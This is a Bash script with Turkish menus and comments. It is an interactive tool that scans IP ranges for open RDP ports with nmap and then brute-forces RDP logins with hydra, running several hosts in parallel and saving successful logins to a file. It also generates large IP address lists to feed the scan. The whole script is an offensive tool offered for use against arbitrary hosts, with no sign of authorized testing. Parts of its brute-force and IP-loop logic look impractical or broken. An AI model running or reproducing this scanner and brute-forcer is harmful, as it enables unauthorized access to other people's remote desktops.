#!/bin/bash

# ASCII Sanatı ile Karşılama
echo "  _   _ _____  _______ "
echo " | | | ||  __ \|__   __|"
echo " | |_| || |  | |  | |   "
echo " |  _  || |  | |  | |   "
echo " | | | || |__| |  | |   "
echo " |_| |_||_____/   |_|   "
echo "                                         "

# Menü İşlevi
menu() {
    while true; do
        echo "Menü:"
        echo "1. IP Port Tarama"
        echo "2. RDP BruteForce"
        echo "3. IP Oluştur"
        echo "Çıkmak için Ctrl+C tuşlayın."
        read -p "Bir seçenek girin (1-3): " choice

        case $choice in
            1)
                echo "1. Dosya mı?"
                echo "2. Tek IP mi?"
                read -p "Bir seçenek girin (1-2): " scan_choice

                case $scan_choice in
                    1)
                        read -p "Dosya adı girin: " ip_file
                        port_scan_nmap d=$ip_file
                        ;;
                    2)
                        read -p "IP adresi girin: " ip
                        port_scan_nmap i=$ip
                        ;;
                    *)
                        echo "Geçersiz seçenek."
                        ;;
                esac
                ;;
            2)
                echo "1. Dosya mı?"
                echo "2. Tek IP mi?"
                read -p "Bir seçenek girin (1-2): " brute_choice

                case $brute_choice in
                    1)
                        read -p "Dosya adı girin: " ip_file
                        brute_force_function d=$ip_file
                        ;;
                    2)
                        read -p "IP ve port (ip:port) girin: " ip_port
                        brute_force_function i=$ip_port
                        ;;
                    *)
                        echo "Geçersiz seçenek."
                        ;;
                esac
                ;;
            3)
                read -p "Başlangıç IP adresini girin: " start_ip
                read -p "Bitiş IP adresini girin: " end_ip
                generate_ips "$start_ip" "$end_ip"
                ;;
            *)
                echo "Geçersiz seçenek."
                ;;
        esac
    done
}

# Port taramasını gerçekleştiren fonksiyon
port_scan_nmap() {
    success_file="rdp_basarili.txt"
    failure_file="rdp_basarısız.txt"
    
    scan_ip() {
        local target_ip=$1
        local target_port=3389

        echo "Tarama yapılıyor: $target_ip:$target_port"
        if nmap -p $target_port $target_ip | grep -q "$target_port/tcp open"; then
            echo "Başarılı: $target_ip:$target_port" | tee -a $success_file
        else
            echo "Başarısız: $target_ip:$target_port" | tee -a $failure_file
        fi
    }

    if [[ $1 == i=* ]]; then
        ip=${1#i=}
        scan_ip $ip
    elif [[ $1 == d=* ]]; then
        file=${1#d=}
        while IFS= read -r line; do
            ip=$(echo $line | cut -d: -f1)
            scan_ip $ip
        done < "$file"
    else
        echo "Kullanım: $0 i=ip veya $0 d=dosya.txt"
        exit 1
    fi
}

# BruteForce işlemini gerçekleştiren fonksiyon
brute_force_function() {
    success_file="başarılı.txt"
    failure_file="başarısız.txt"

    charset=( {a..z} {0..9} )

    generate_and_test() {
        local target_ip=$1
        local target_port=$2
        local length=$3
        local combinations=$(eval echo "{$4}")

        for combination in $combinations; do
            echo "Testing username and password: $combination on $target_ip:$target_port"
            result=$(hydra -l $combination -p $combination -t 1 -f rdp://$target_ip:$target_port 2>&1)

            if [[ $result == *"login:"* ]]; then
                echo "Başarılı: $combination on $target_ip:$target_port" | tee -a $success_file
            else
                echo "Başarısız: $combination on $target_ip:$target_port" | tee -a $failure_file
            fi
        done
    }

    test_combinations() {
        local target_ip=$1
        local target_port=$2

        generate_and_test $target_ip $target_port 1 '{a..z}{0..9}'

        for c1 in {a..z}{0..9}; do
            generate_and_test $target_ip $target_port 2 "{$c1}{a..z}{0..9}"
        done

        for c1 in {a..z}{0..9}; do
            for c2 in {a..z}{0..9}; do
                generate_and_test $target_ip $target_port 3 "{$c1}{$c2}{a..z}{0..9}"
            done
        done

        max_length=10
        for length in $(seq 4 $max_length); do
            chars='{a..z}{0..9}'
            for (( i=1; i<$length; i++ )); do
                chars="$chars{a..z}{0..9}"
            done
            generate_and_test $target_ip $target_port $length $chars
        done
    }

    process_ip_list() {
        local ip_list=("$@")
        for ip_port in "${ip_list[@]}"; do
            IFS=':' read -r target_ip target_port <<< "$ip_port"
            test_combinations $target_ip $target_port &
        done
        wait
    }

    if [[ $1 == i=* ]]; then
        ip_port=${1#i=}
        IFS=':' read -r target_ip target_port <<< "$ip_port"
        test_combinations $target_ip $target_port
    elif [[ $1 == d=* ]]; then
        file=${1#d=}
        ip_array=()
        while IFS=: read -r target_ip target_port; do
            ip_array+=("$target_ip:$target_port")
            if [ "${#ip_array[@]}" -eq 5 ]; then
                process_ip_list "${ip_array[@]}"
                ip_array=()
            fi
        done < "$file"
        if [ "${#ip_array[@]}" -gt 0 ]; then
            process_ip_list "${ip_array[@]}"
        fi
    else
        echo "Kullanım: $0 i=ip:port veya $0 d=ip.txt"
        exit 1
    fi
}

# IP adreslerini oluşturma fonksiyonu
generate_ips() {
    local start_ip=$1
    local end_ip=$2

    # IP adreslerini noktalarına göre ayır
    IFS=. read -r s1 s2 s3 s4 <<< "$start_ip"
    IFS=. read -r e1 e2 e3 e4 <<< "$end_ip"

    output_file="ipler.txt"

    # IP adreslerini artırmak için döngüler
    for ((i1=s1; i1<=e1; i1++)); do
        for ((i2=s2; i2<=e2; i2++)); do
            for ((i3=s3; i3<=e3; i3++)); do
                for ((i4=s4; i4<=e4; i4++)); do
                    echo "$i1.$i2.$i3.$i4" >> "$output_file"
                    if [[ "$i1" -eq "$e1" && "$i2" -eq "$e2" && "$i3" -eq "$e3" && "$i4" -eq "$e4" ]]; then
                        break 4
                    fi
                done
                # i4 255'e ulaştığında i3'ü artır
                if [[ "$i3" -eq 255 && "$i4" -eq 255 ]]; then
                    break
                fi
            done
            # i3 255'e ulaştığında i2'yi artır
            if [[ "$i2" -eq 255 && "$i3" -eq 255 && "$i4" -eq 255 ]]; then
                break
            fi
        done
        # i2 255'e ulaştığında i1'i artır
        if [[ "$i1" -eq 255 && "$i2" -eq 255 && "$i3" -eq 255 && "$i4" -eq 255 ]]; then
            break
        fi
    done
}

menu

